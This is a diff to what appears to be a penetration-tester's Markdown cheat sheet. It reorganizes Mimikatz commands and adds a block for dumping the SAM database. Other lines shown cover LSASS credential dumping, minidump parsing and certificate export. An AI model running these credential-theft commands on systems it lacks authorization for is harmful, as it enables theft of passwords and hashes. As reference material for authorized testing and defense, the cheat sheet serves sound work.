@@ -239,10 +239,13 @@ masscan --readscan massscan-all-tcp-udp
 ```
 
 # Mimikatz
+Logging (run at the start):
+```
+log logfile1
+```
 
 Dumping hashes locally:
 ```
-log logfile1
 privilege::debug
 sekurlsa::logonpasswords
 ```
@@ -258,10 +261,17 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonPasswords
 ```
 
-Extract certificate
+Extract certificate:
 ```
 crypto::capi
 crypto::certificates /systemstore:local_machine /export
+```
+
+Dump SAM:
+```
+privilege::debug
+token::elevate
+lsadump::sam
 ```
 
 # Crackmapexec
